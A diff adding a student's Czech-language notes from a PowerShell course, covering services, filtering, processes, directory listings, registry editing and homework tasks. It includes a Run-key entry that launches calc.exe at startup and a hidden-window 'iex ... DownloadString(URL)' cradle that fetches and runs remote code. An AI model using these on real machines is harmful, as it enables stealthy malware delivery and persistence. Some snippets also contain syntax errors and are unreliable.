@@ -1,0 +1,122 @@
+sc start <registr_name> nefunguje stejne v CMD jako v PSHell. V cmd se normalne execne prikaz, kdezto v PShell vytvori soubor a ulozi do nej <register_name>
+potom by se v PShell musel spustit jako Get-Content .\start a spusti se prikaz v souboru
+
+pokud bychom chteli v Psheel vypsat services tak Get-Services
+napoveda jako get-help <command_name> == get-help get-service, pro vypsani pouze prikladu je get-help get-service -example
+pokud by nas zajimalo vice, tak get-help Get-Process -example treba
+
+pro update helpu = update-help
+
+prace s VM muze byt get-vm, set-vm a parametry 
+
+
+get-service "wmi*" nalezne service, ktery se jmenuje wmi
+
+vypsani aliasu
+get-alias
+
+PRIPRAVA NA PRVNI TEST PRIKAZY
+get-help <command-name>
+seznam slubeb: get-service
+vypis seznam slubeb jako tabulku: get-service | format-table *, ta hvezdicka zajisti, ze se vypisi vsechny sloupce. Bez * to vypise pouze ty, ktere microsoft povazuje za dulezite
+get-service | get-member - zobrazi nam metody, krete se mohou volat na danou vec
+Filtrovani: vypis servicu, ktere jsou ve stavu Running: Get-Service | where {($_.Status -eq "Running")}
+	    vypis servicu, ktere jsou ve stavu Running a zacinaji na pismeno L: Get-Service | where {($_.Status -eq "Running") - and ($_.Name -like "L*")}
+	    metoda 2: get-service | Where-Object {$_.Status -eq "Running"} | Where-Object {$_.Name -like "L*"}
+	    metoda 3: get-service | where-object {$_.Status -eq "Running" -and  $_.Name -like "L*"}
+
+
+vypiste seznam slubez, jejich kratke jmeno se shoduji s dlouhym jmenem
+get-service | where {$_.Name -eq $_.DisplayName} == misto where lze pouzit where-object
+
+
+vypiste vsechny prikazy, ktere pracuji se sluzbami
+get-command == ziskani vsech prikazu, ktere lze pouzit. Nejsou tam ty, ktere musime naimportovat. Nejsou tam zadne prikazy z ActiveDirectory.
+Get-Command -Noun Service a nebo get-help get-service (tady pozor, protoze pokud neni internet pres get-help dostanes hovno)
+
+
+vypiste vsechny procesy setridene podle cpu od nejvetsi hodnoty po nejmensi a jejich pid (id) je mensi nez 1000
+mensi nez tisic: get-process | where {$_Id -lt 1000} == je to LT ale malym, je to jako lower than
+vypis hodnoty cpu od nejvetsi po nejmensi: Get-Process | Sort-Object -Property CPU -Descending
+komplet command: Get-Process | where {$_.Id -lt 1000} | Sort-Object -Property CPU -Descending
+metoda Vojacek: get-process | where-objec {$_.Id -le 1000} | Sort-object cpu -desc
+
+
+vypiste obsah adresare C:\Windows
+dir d:\Windows
+
+vypiste jen soubory v c:\windows
+dir c:\windows -file
+metoda Vojacek: dir c:\windows\ | where-object {$_.mode -like "-*"}
+
+vypsani prumerne delky vsech souboru v danem adresari
+dir C:\Windows\ | Measure-Object length -Average
+
+
+jak vlezt do slozky registru:
+cd ..
+cd..
+cd hkcu:
+
+cd hkcu:\software\microsoft\windows\currentversion\run - tady se je vse, co se spousti pri spusteni pocitace
+
+vytvoreni noveho klice pro automaticke spusteni kalkulacky pri startu
+New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name calc -Value "calc.exe"
+new-itemproperty . -name calc -PropertyName string -value calc.exe
+smazani registru: remove-itemproperty . -name calc == ta tecka znamena, ze to chci delat tady, v tom aktualnim adresari
+get-itemproperty vypise registry
+
+
+vytvorte skript, ktery vytvori adresar temporary na C a vypise do souboru obsah.txt osah tohoto adresare
+mkdir C:\ -Name temporary
+New-Item C:\temporary -Name obsah.txt
+dir c:\ | Out-File C:\temporary\obsah.txt
+Get-Content c:\temporary\obsah.txt
+
+mkdir C:\ -Name temporary
+New-Item C:\temporary -Name obsah.txt
+dir c:\ > C:\temporary\obsah.txt
+Get-Content c:\temporary\obsah.txt
+
+
+vytvorte skript, ktery vytvori adresar temporary na C a vypise do souboru obsah.txt osah tohoto adresare + kontrola zda uz existuje adresar
+
+$Folder = 'C:\temporary'
+if(Test-Path -Path $Folder){
+    "Path already exists!"
+}
+else {
+    mkdir C:\ -Name temporary
+}
+
+New-Item C:\temporary -Name obsah.txt == tady to muze hazet error, protoze pokud uz file existuje, tak to vyhodi hlasku, ze uz existuje
+dir c:\ | Out-File C:\temporary\obsah.txt
+Get-Content C:\temporary\obsah.txt
+
+
+Reseni od Vojacka:
+$path = '"C:\mujtemp'
+if(!Test-Path $path){
+	new-item -itemtype Directory -Force -Path $path
+	write-host -f yellow "Create folder"
+}
+else {Write-Host -f Red "Folder already exists"}
+
+dir c:\Windows | export-csv $path"\obsah.txt"
+
+
+iex je prikaz, ktery invoknul expression = iex (New-Object System.net.WebClient).DownloadString("URL")
+start powershell -hidden -noe iex (New-Object System.net.WebClient).DownloadString("URL")
+iexpress ve windowsu vytvori novy nas .exe soubor
+
+
+
+DU
+vytvorte skript, ktery bude cekat na proces calc.exe a ukonci jej
+
+vytvorte skript, ktery nacte do promennych $a a $b hodnoty z klavesnice a pokud bude jejich soucet vetsi nez 20, tak vypise tento soucet.
+V opacnem pripade tyto cisla odecte a vypise jejich rozdil
+
+Zajistete aby se skripty daly spoustet bez omezeni i po ulozeni v ISE
+
+Vypiste obsah vsech adresaru v prvni urovni adresare C:\windows\boot
